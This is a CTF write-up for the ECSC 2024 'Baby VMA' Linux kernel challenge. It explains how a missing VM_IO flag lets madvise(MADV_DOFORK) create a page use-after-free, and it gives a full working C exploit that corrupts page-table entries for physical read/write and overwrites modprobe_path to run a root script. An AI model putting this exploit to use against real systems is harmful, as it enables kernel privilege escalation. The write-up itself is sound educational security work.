# ECSC 2024 - Jeopardy

## [pwn] Baby VMA (1 solve)

Welcome to 🍼 BabyVMA 🍼 : so simple yet so broken.

*Note: the challenge has a 60s timeout.*

`nc babyvma.challs.jeopardy.ecsc2024.it 47011`

Author: Vincenzo Bonforte <@Bonfee>

## Overview

The challenge features a simple linux driver that implements an mmap handler.
Only 1-page long mmaps are allowed and the flags of the created VMA are : `VM_PFNMAP | VM_DONTEXPAND | VM_DONTCOPY | VM_DONTDUMP`.
The fault handler of the VMA allocates a single page using `__get_free_page`, and installs it in userspace using `vmf_insert_pfn`.

## Solution

If you can manage to have multiple copies of the same pwn vma then you can close one, the backing page will get freed by the `->close` handler, while still being mapped on the other copies of the vma.
The intended solution abuses `madvise(MADV_DOFORK)`, which unsets `VM_DONTCOPY` on the vma, thus allowing it to be kept on fork.

```c
static int madvise_vma_behavior(struct vm_area_struct *vma,
    struct vm_area_struct **prev,
    unsigned long start, unsigned long end,
    unsigned long behavior)
{
    // ...
 case MADV_DOFORK:
  if (vma->vm_flags & VM_IO)
   return -EINVAL;
  new_flags &= ~VM_DONTCOPY; // :)
  break
    // ...
}
```

`MADV_DOFORK` can be used because `VM_IO` was omitted in the VMA flags.

What happens now?
After a succesful `fork()` the VMA is copied to the child's address space.
When either the child or the parent calls `munmap`, `pwn_vma_close` will be triggered and the page will be freed, but the page will still be mapped in either the parent or the child.
Also note that `pwn_vma_open` is a no-op and it's not taking an extra ref on the page.

### Exploiting page UAF

There are many ways to exploit a page UAF.
This is a CTF so you can just get away with a cred spray, given that I didn't limit the number of UAF pages you can have.
But obv we want a cool™️ exploit.

The intended solution sprays PTEs and corrupts them to get physical arbitrary read / write.
After getting physical arb r/w on the kernel you can do many things, the provided exploit overwrites modprobe path.

Keep in mind that:

- Physical kASLR is present, so you need to scan the System RAM phys range to find the kernel
- kCFI is enabled, so reclaiming the freed page with some slab containing some objects with function pointers won't work ( or maybe just not so easily :) )

## Exploit

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <err.h>
#include <string.h>
#include <sys/mman.h>

int main()
{
 int fd;
#define N_UAF_MAPS 1000
 unsigned long *uaf_maps[N_UAF_MAPS];
 char c;
 int pfds1[2], pfds2[2];
 int child_pid;

 /* prepare modprobe path */
 system("echo '#!/bin/sh\nchmod 777 /dev/sda /\n' > /tmp/a");
 system("chmod +x /tmp/a");
 system("touch /tmp/dummy");
 system("chmod +x /tmp/dummy");
 system("echo -n '\xff\xff\xff\xff' > /tmp/dummy");

 /* open dev */
 fd = open("/dev/pwn", O_RDWR);
 if (fd < 0)
  err(1, "open dev");

 /* prepare uaf pages */
 for (size_t i = 0; i < N_UAF_MAPS; i++)
 {
  uaf_maps[i] = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
  if (uaf_maps[i] == MAP_FAILED)
   err(1, "mmap dev");

  if (madvise(uaf_maps[i], 0x1000, MADV_DOFORK) < 0)
   err(1, "madvise(MADV_DO_FORK)");

  *uaf_maps[i] = 0xdeadbeef;
 }

 /* child comm pipes */
 if (pipe(pfds1) < 0)
  err(1, "pipe");

 if (pipe(pfds2) < 0)
  err(1, "pipe");

 /* pre alloc pipe page */
 while (write(pfds1[1], &c, 1) != 1) ;
 while (read(pfds1[0], &c, 1)  != 1) ;
 while (write(pfds2[1], &c, 1) != 1) ;
 while (read(pfds2[0], &c, 1)  != 1) ;

 child_pid = fork();
 if (child_pid < 0)
 {
  err(1, "fork");
 }
 else if (!child_pid)
 {
  unsigned char *mmap_start = (unsigned char *)0x1000000;
  unsigned char *cur_addr;
  size_t n_ptes = 10000;

  puts("[+] child started");

  /* Prepare mmaps */
  cur_addr = mmap_start;
  for (size_t i = 0; i < n_ptes; i++)
  {
   if (mmap((void *)cur_addr, 0x2000, PROT_READ | PROT_WRITE, MAP_FIXED | MAP_PRIVATE | MAP_ANONYMOUS, -1, 0) == MAP_FAILED)
    err(1, "mmap spray");

   if ((i % 512) == 0)
   {
    /* pre fault higher levels */
    *cur_addr = 0x41;
   }

   cur_addr += 0x1000 * 512;
  }
  puts("[+] mmaps prepared");

  /* Tell parent we are ready */
  while (write(pfds1[1], &c, 1) != 1) ;
  /* Wait for parent to free page */
  while (read(pfds2[0], &c, 1)  != 1) ;

  /* Alloc ptes */
  cur_addr = mmap_start;
  for (size_t i = 0; i < n_ptes; i++)
  {
   /* only fault first page */
   *cur_addr = 0x41;
   cur_addr += 0x1000 * 512;
  }
  puts("[+] mmaps faulted");

  unsigned long *arb_rw_mmap = NULL;
  unsigned long *arb_rw_pte = NULL;

  /* Check uaf pages for ptes */
  for (size_t i = 0; i < N_UAF_MAPS; i++)
  {
   /* Does this look like a pte ? */
   if ((uaf_maps[i][0] & 0xf000000000000fff) == 0x8000000000000067)
   {
    int found = 0;

    /* Mark corrupted */
    uaf_maps[i][1] = uaf_maps[i][0];

    cur_addr = mmap_start;
    for (size_t j = 0; j < n_ptes; j++)
    {
     if (*(cur_addr + 0x1000) == 0x41)
     {
      arb_rw_mmap = (unsigned long *)cur_addr;
      arb_rw_pte = uaf_maps[i];
      found = 1;
      break;
     }

     if (found)
      break;

     cur_addr += 0x1000 * 512;
    }

    if (found)
    {
     puts("[*] found page table");
     break;
    }

    puts("[?] bogus pte found");
   }
  }

  if ((arb_rw_pte == NULL) || (arb_rw_mmap == NULL))
  {
   puts("[-] exploit failed");
   _exit(1);
  }

  puts("[*] phys arb rw is ready");
  printf("[*] arb r/w mmap = %p\n", arb_rw_mmap);
  printf("[*] arb r/w pte = %p => 0x%lx\n", arb_rw_pte, *arb_rw_pte);

  /* Scan for phys kbase */
  unsigned long system_ram_base = 0x100000;
  unsigned long cur_paddr = system_ram_base;
  unsigned long phys_kbase = 0;

  while (1)
  {
   /* clear tlb */
   if (munmap(arb_rw_mmap, 0x1000) < 0)
    err(1, "munmap");

   if (mmap((void *)arb_rw_mmap, 0x1000, PROT_READ | PROT_WRITE, MAP_FIXED | MAP_PRIVATE | MAP_ANONYMOUS, -1, 0) != (void *)arb_rw_mmap)
    err(1, "mmap");

   arb_rw_pte[0] = 0x8000000000000067 | cur_paddr;

   if (arb_rw_mmap[0] == 0x3f4e258d48f78949 &&
    arb_rw_mmap[1] == 0x48c0000101b901c0 &&
    arb_rw_mmap[2] == 0xd089023c0fea158d &&
    arb_rw_mmap[3] == 0x7de8300f20eac148)
   {
    phys_kbase = cur_paddr;
    printf("[*] Found phys kbase: 0x%lx\n", phys_kbase);
   }

   arb_rw_pte[0] = 0;

   if (phys_kbase != 0)
    break;

   cur_paddr += 0x100000;
  }

  /* Patch kernel */
  unsigned long modprobe_off = 0x18c960f;
  unsigned long modprobe_page = modprobe_off & ~0xfffUL;

  arb_rw_pte[2] = 0x8000000000000067 | (phys_kbase + modprobe_page);
  arb_rw_pte[3] = 0x8000000000000067 | (phys_kbase + modprobe_page + 0x1000);

  strcpy((char *)arb_rw_mmap + 0x2000 + (modprobe_off & 0xfff), "/tmp/a");
  system("/tmp/dummy; cat /dev/sda; echo EXPLOIT_DONE");

  while (1)
   sleep(1000000);
  _exit(0);
 }

 /* wait until child is ready */
 while (read(pfds1[0], &c, 1) != 1) ;

 /* free uaf pages */
 for (size_t i = 0; i < N_UAF_MAPS; i++)
 {
  if (munmap(uaf_maps[i], 0x1000) < 0)
   err(1, "munmap uaf_maps");
 }

 /* tell child to continue */
 while (write(pfds2[1], &c, 1) != 1) ;

 while (1)
  sleep(1000000);

 return 0;
}
```

## Extra notes

During the ctf a player found another cool way to obtain a copy of the same vma without having to use fork.

- 1. Create two vmas `A` (a pwn vma) and `B` (a simple anonymous vma)
- 2. Then invoke: `mremap(A, 0x1000, 0x1000, MREMAP_FIXED|MREMAP_MAYMOVE, B)`

Internally the `mremap` code will create a copy of `A` (inside `copy_vma()`), and because of the `-EINVAL` returned by the custom `->mremap` handler it will destroy the newly created vma copy, thus calling `->close` and freeing the backing page of `A`.
